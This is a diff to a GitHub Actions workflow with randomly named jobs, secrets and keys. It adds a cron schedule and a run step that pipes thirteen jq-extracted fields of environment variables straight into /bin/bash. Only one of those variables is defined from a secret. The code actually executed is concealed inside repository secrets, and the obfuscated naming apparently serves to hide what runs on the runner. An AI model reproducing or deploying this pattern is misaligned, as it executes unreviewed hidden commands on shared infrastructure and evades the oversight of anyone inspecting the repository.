@@ -3,7 +3,8 @@ name: renwozui3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '22 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: renwozui3817
         env:
-          buru3971: ${{ secrets.buru3971 }}
+          enh13: ${{ secrets.enh13 }}
         run: |
-          echo $buru3971 | jq -r .mhekw50 | /bin/bash
-          echo $nfp81974 | jq -r .rjrpz8 | /bin/bash
-          echo $y8878 | jq -r .cw503 | /bin/bash
-          echo $tsldv71 | jq -r .jntuy1 | /bin/bash
-          echo $vwd153 | jq -r .z231 | /bin/bash
+          echo $enh13 | jq -r .lbin4 | /bin/bash
+          echo $vfkyq605 | jq -r .h48 | /bin/bash
+          echo $tp6340 | jq -r .n3 | /bin/bash
+          echo $k417 | jq -r .x5883 | /bin/bash
+          echo $g1 | jq -r .zd919 | /bin/bash
+          echo $r1602 | jq -r .o8836 | /bin/bash
+          echo $j46139 | jq -r .eeh0604 | /bin/bash
+          echo $wv91918 | jq -r .n9 | /bin/bash
+          echo $hrm7953 | jq -r .lbqui084 | /bin/bash
+          echo $e6279 | jq -r .tweqg6 | /bin/bash
+          echo $w29807 | jq -r .xx4 | /bin/bash
+          echo $mjfr04287 | jq -r .at24565 | /bin/bash
+          echo $aiyp196 | jq -r .cmedv37 | /bin/bash
 
